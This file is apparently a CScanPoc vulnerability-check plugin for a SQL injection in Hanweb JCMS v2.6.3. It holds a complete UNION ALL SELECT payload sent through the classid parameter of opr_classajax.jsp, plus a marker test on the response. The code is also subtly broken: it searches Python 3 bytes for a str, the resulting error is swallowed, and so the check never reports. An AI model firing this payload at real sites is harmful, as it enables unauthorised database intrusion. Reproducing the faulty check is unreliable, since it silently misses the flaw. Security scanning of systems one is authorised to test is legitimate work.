# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'JCMS_0001'  # 平台漏洞编号，留空
    name = '大汉JCMS v2.6.3 /opr_classajax.jsp SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-01'  # 漏洞公布时间
    desc = '''
        对参数没有做过滤处理，并且采用拼接SQL语句形式编写代码，导致注入产生。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS v2.6.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ad00afaf-8c4f-45ac-9b95-3c10baeb4169'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/jcms/jcms_files/jcms1/web1/site/module/sitesearch/opr_classajax.jsp?"
                       "classid=11%20UNION%20ALL%20SELECT%20NULL,CHR(113)||CHR(122)||CHR(113)"
                       "||CHR(106)||CHR(113)||CHR(78)||CHR(89)||CHR(99)||CHR(76)||CHR(117)||"
                       "CHR(72)||CHR(100)||CHR(80)||CHR(72)||CHR(107)||CHR(113)||CHR(107)||CHR"
                       "(106)||CHR(118)||CHR(113)%20FROM%20DUAL--")
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if "qzqjqNYcLuHdPHkqkjvq" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
